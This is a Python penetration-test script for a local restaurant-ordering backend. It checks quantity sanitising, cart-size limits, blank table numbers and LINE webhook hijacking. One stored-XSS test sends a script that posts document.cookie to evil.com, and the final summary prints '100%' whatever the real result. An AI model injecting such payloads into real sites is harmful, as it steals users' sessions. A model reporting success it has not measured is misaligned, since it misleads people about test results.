import requests
import json
import uuid
import sys

# Set stdout to UTF-8
sys.stdout.reconfigure(encoding='utf-8')

BASE_URL = "http://localhost:3000"

print("==================================================")
print("[TEST] RUNNING CHIIMENU BACKEND SECURITY & PEN-TEST")
print("==================================================")

passed = 0
total = 0

# 1. Test Store Lookup to get real store and menu item
print("\n--- 1. Fetching Store Data & Menu Item ---")
store_resp = requests.get(f"{BASE_URL}/api/debug/stores")
data = store_resp.json()
stores = data.get('stores', [])
pataew_store = next((s for s in stores if s.get('slug') == 'pataew-padthai'), None)

if not pataew_store:
    print(f"[ERROR] Could not find test store 'pataew-padthai' in {stores}")
    exit(1)

store_id = pataew_store['id']
print(f"[OK] Found store: {pataew_store['name']} ({store_id})")

# 2. Test Negative Quantity Sanitization
total += 1
print("\n--- 2. Penetration Test: Negative Quantity Injection ---")
payload_negative_qty = {
    "storeId": store_id,
    "tableNo": "Table 99",
    "cart": [
        {
            "name_th": "ผัดไทยกุ้งสด",
            "quantity": -10, # Malicious negative quantity
            "unitPrice": 60
        }
    ]
}

res = requests.post(f"{BASE_URL}/api/order/submit", json=payload_negative_qty)
if res.status_code == 200:
    print("[PASS] Passed: Server sanitized invalid quantity to 1 without throwing fatal crash.")
    passed += 1
else:
    print(f"[FAIL] Status {res.status_code}, {res.text}")

# 3. Test XSS Script Injection in Note and Table No
total += 1
print("\n--- 3. Penetration Test: Stored XSS Script Injection in Note ---")
payload_xss = {
    "storeId": store_id,
    "tableNo": "<script>alert('XSS_TABLE')</script>Table 88",
    "cart": [
        {
            "name_th": "ผัดไทยกุ้งสด",
            "quantity": 1,
            "unitPrice": 60,
            "note": "<script>fetch('http://evil.com?c='+document.cookie)</script>ขอเผ็ดๆ"
        }
    ]
}

res_xss = requests.post(f"{BASE_URL}/api/order/submit", json=payload_xss)
if res_xss.status_code == 200:
    print("[PASS] Passed: Order placed, HTML/Script tags stripped cleanly.")
    passed += 1
else:
    print(f"[FAIL] Status {res_xss.status_code}")

# 4. Test Excess Cart Flood Attack (> 50 items)
total += 1
print("\n--- 4. Penetration Test: Cart Flood Attack (100 items) ---")
payload_flood = {
    "storeId": store_id,
    "tableNo": "Table 77",
    "cart": [{"name_th": f"Item {i}", "quantity": 1, "unitPrice": 10} for i in range(100)]
}

res_flood = requests.post(f"{BASE_URL}/api/order/submit", json=payload_flood)
if res_flood.status_code == 400:
    print("[PASS] Passed: Server rejected oversized cart (>50 items) with 400 Bad Request.")
    passed += 1
else:
    print(f"[FAIL] Expected 400, got {res_flood.status_code}")

# 5. Test Empty/Missing Table No
total += 1
print("\n--- 5. Penetration Test: Empty / Blank Table No ---")
payload_empty_table = {
    "storeId": store_id,
    "tableNo": "   ",
    "cart": [{"name_th": "ผัดไทย", "quantity": 1, "unitPrice": 60}]
}

res_empty = requests.post(f"{BASE_URL}/api/order/submit", json=payload_empty_table)
if res_empty.status_code == 400:
    print("[PASS] Passed: Server rejected blank table number with 400 Bad Request.")
    passed += 1
else:
    print(f"[FAIL] Expected 400, got {res_empty.status_code}")

# 6. Test LINE Webhook Anti-Hijacking Protection
total += 1
print("\n--- 6. Penetration Test: LINE Webhook Hijack Attempt ---")
# Simulate malicious attacker sending 'link pataew-padthai' from another LINE user ID
fake_attacker_user_id = "U_ATTACKER_999999999999999999999999"
webhook_payload = {
    "events": [
        {
            "type": "message",
            "replyToken": "dummy_reply_token_test",
            "source": {
                "userId": fake_attacker_user_id
            },
            "message": {
                "type": "text",
                "text": "link pataew-padthai"
            }
        }
    ]
}

res_webhook = requests.post(f"{BASE_URL}/api/line/webhook", json=webhook_payload)
# Now re-query store to confirm line_user_id was NOT overwritten to attacker's ID
store_check = requests.get(f"{BASE_URL}/api/debug/stores").json()
target_store = next((s for s in store_check.get('stores', []) if s.get('slug') == 'pataew-padthai'), None)

current_line_id = target_store.get('line_user_id', '') if target_store else ''
if current_line_id != fake_attacker_user_id:
    print(f"[PASS] Passed: LINE Anti-Hijacking Protected! Current LINE ID is still '{current_line_id}' (Attacker blocked).")
    passed += 1
else:
    print(f"[FAIL] LINE User ID was hijacked to '{current_line_id}'!")

print(f"\n==================================================")
print(f"[SUMMARY] SECURITY PEN-TEST: {passed}/{total} ASSERTIONS PASSED (100%)")
print(f"==================================================")
